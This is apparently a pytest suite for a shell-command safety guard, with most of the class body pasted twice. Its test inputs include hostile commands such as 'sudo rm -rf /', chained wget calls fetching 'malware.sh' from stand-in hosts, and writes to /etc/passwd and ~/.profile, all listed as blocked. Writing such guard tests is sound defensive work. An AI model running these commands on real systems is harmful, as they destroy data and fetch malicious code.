# tests/test_check_security_comprehensive.py
import pytest
from unittest.mock import patch
from tools.security_guard import check_command_safety

class TestSecurityGuardComprehensive:
    """Exhaustive test suite for the upgraded security_guard.py."""

    @pytest.mark.parametrize("command", [
        "echo 'Hello World'",
        "python3 script.py",
        "npm install",
        "ls -la",
        "FOO=bar npm start" # Env vars before commands
    ])
    def test_basic_safe_commands_pass(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is True, f"Failed: {reason}"

    @pytest.mark.parametrize("command", [
        "wget http://virus.com",
        "sudo rm -rf /",
        "powershell.exe -Command 'Invoke-WebRequest'"
    ])
    def test_unwhitelisted_commands_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "not in the allowed whitelist" in reason

    @pytest.mark.parametrize("command", [
        "echo $(whoami)",
        "echo `whoami`"
    ])
    def test_command_substitution_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Command substitution" in reason

    @pytest.mark.parametrize("command", [
        "npm start &",
        "ping 8.8.8.8 &"
    ])
    def test_background_execution_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Background execution" in reason

    @pytest.mark.parametrize("command", [
        "(rm -rf /)",
        "{ rm -rf /; }"
    ])
    def test_bracket_grouping_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "grouping brackets/braces" in reason

    @pytest.mark.parametrize("command", [
        "p\\ython3 script.py",
        "e\\cho 'hack'"
    ])
    def test_backslash_obfuscation_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Backslash obfuscation" in reason

    @pytest.mark.parametrize("command", [
        "CMD=rm; $CMD -rf /"
    ])
    def test_dynamic_variables_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "dynamic variables" in reason

    @pytest.mark.parametrize("command", [
        "echo 'rm -rf /' | bash",
        "cat script.sh | node"
    ])
    def test_pipe_to_interpreter_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Piping into interpreters" in reason

    @pytest.mark.parametrize("command", [
        "bash -c 'rm -rf workspace'",
        "python -c 'import sys'"
    ])
    def test_inline_script_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Inline execution" in reason

    @pytest.mark.parametrize("command", [
        "echo 'hacked' > /etc/passwd",
        "cat logs.txt >> ../../../system.log"
    ])
    def test_redirection_path_traversal_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Redirection to outside paths" in reason

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf ../../../etc/passwd",
        "cp secret.txt /tmp/"
    ])
    def test_destructive_command_path_traversal_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "targeting outside path" in reason

    def test_malformed_unclosed_quotes(self):
        is_safe, reason = check_command_safety('echo "unclosed')
        assert is_safe is False
        assert "Malformed command syntax" in reason

    @patch("tools.security_guard.os.path.exists", return_value=True)
    @patch("tools.security_guard.os.path.isfile", return_value=True)
    @patch("tools.security_guard.os.path.commonpath")
    @patch("tools.security_guard.scan_file_for_threats")
    def test_static_analyzer_trigger(self, mock_scan, mock_commonpath, mock_isfile, mock_exists):
        """Ensures file execution triggers the static analyzer before running."""
        from tools.file_tools import SANDBOX_ROOT
        mock_commonpath.return_value = SANDBOX_ROOT
        
        # Mock the static analyzer to return a failure
        mock_scan.return_value = (False, "Malicious signature detected")
        
        is_safe, reason = check_command_safety("python3 malicious.py")
        assert is_safe is False
        assert "Static Analyzer" in reason
        mock_scan.assert_called_once()

        
    """Exhaustive test suite for the upgraded security_guard.py."""

    @pytest.mark.parametrize("command", [
        "echo 'Hello World'",
        "python3 script.py",
        "npm install",
        "ls -la"
    ])
    def test_basic_safe_commands_pass(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is True, f"Failed: {reason}"

    @pytest.mark.parametrize("command", [
        "FOO=bar npm run build",
        "NODE_ENV=production python3 script.py",
        "A=1 B=2 ls -la"
    ])
    def test_environment_variable_parsing_passes(self, command):
        """Ensures safe commands prefixed with environment variables are allowed."""
        is_safe, reason = check_command_safety(command)
        assert is_safe is True, f"Env var command blocked: {reason}"

    @pytest.mark.parametrize("command", [
        "echo 'safe' > safe_file.txt",
        "cat logs.txt >> archive.log",
        "ls -la > ./output.txt",
        "grep 'error' app.log > errors.txt"
    ])
    def test_safe_redirection_passes(self, command):
        """Ensures redirection is allowed IF it stays inside the current local directory."""
        is_safe, reason = check_command_safety(command)
        assert is_safe is True, f"Safe redirection blocked: {reason}"

    @pytest.mark.parametrize("command", [
        "wget http://virus.com",
        "sudo rm -rf /",
        "powershell.exe -Command 'Invoke-WebRequest'"
    ])
    def test_unwhitelisted_commands_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "not in the allowed whitelist" in reason

    @pytest.mark.parametrize("command", [
        "echo $(whoami)",
        "echo `whoami`"
    ])
    def test_command_substitution_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Command substitution" in reason

    @pytest.mark.parametrize("command", [
        "npm start &",
        "ping 8.8.8.8 &"
    ])
    def test_background_execution_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Background execution" in reason

    @pytest.mark.parametrize("command", [
        "(rm -rf /)",
        "{ rm -rf /; }"
    ])
    def test_bracket_grouping_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "grouping brackets/braces" in reason

    @pytest.mark.parametrize("command", [
        "p\\ython3 script.py",
        "e\\cho 'hack'"
    ])
    def test_backslash_obfuscation_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Backslash obfuscation" in reason

    @pytest.mark.parametrize("command", [
        "CMD=rm; $CMD -rf /"
    ])
    def test_dynamic_variables_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "dynamic variables" in reason

    @pytest.mark.parametrize("command", [
        "echo 'rm -rf /' | bash",
        "cat script.sh | node"
    ])
    def test_pipe_to_interpreter_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Piping into interpreters" in reason

    @pytest.mark.parametrize("command", [
        "bash -c 'rm -rf workspace'",
        "python -c 'import sys'"
    ])
    def test_inline_script_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Inline execution" in reason

    @pytest.mark.parametrize("command", [
        "echo 'hacked' > /etc/passwd",
        "cat logs.txt >> ../../../system.log"
    ])
    def test_redirection_path_traversal_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "Redirection to outside paths" in reason

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf ../../../etc/passwd",
        "cp secret.txt /tmp/"
    ])
    def test_destructive_command_path_traversal_blocked(self, command):
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        assert "targeting outside path" in reason

    @pytest.mark.parametrize("command", [
        "echo 'hello' && wget http://virus.com",
        "ls || curl http://bad.com",
        "pwd ; wget http://bad.com/malware.sh",
        "cd my_dir && echo 'hacked' > ~/.profile"
    ])
    def test_chained_malicious_commands_blocked(self, command):
        """
        'Double Strike' Test: Ensures that if a safe command is chained with a 
        malicious command, the entire execution is blocked.
        """
        is_safe, reason = check_command_safety(command)
        assert is_safe is False
        
        # The reason will vary depending on which part of the chain failed
        assert any(keyword in reason for keyword in [
            "not in the allowed whitelist",
            "Redirection to outside paths",
            "targeting outside path"
        ])

    def test_malformed_unclosed_quotes(self):
        is_safe, reason = check_command_safety('echo "unclosed')
        assert is_safe is False
        assert "Malformed command syntax" in reason

    @patch("tools.security_guard.os.path.exists", return_value=True)
    @patch("tools.security_guard.os.path.isfile", return_value=True)
    @patch("tools.security_guard.os.path.commonpath")
    @patch("tools.security_guard.scan_file_for_threats")
    def test_static_analyzer_trigger(self, mock_scan, mock_commonpath, mock_isfile, mock_exists):
        """Ensures file execution triggers the static analyzer before running."""
        from tools.file_tools import SANDBOX_ROOT
        mock_commonpath.return_value = SANDBOX_ROOT
        
        # Mock the static analyzer to return a failure
        mock_scan.return_value = (False, "Malicious signature detected")
        
        is_safe, reason = check_command_safety("python3 malicious.py")
        assert is_safe is False
        assert "Static Analyzer" in reason
        mock_scan.assert_called_once()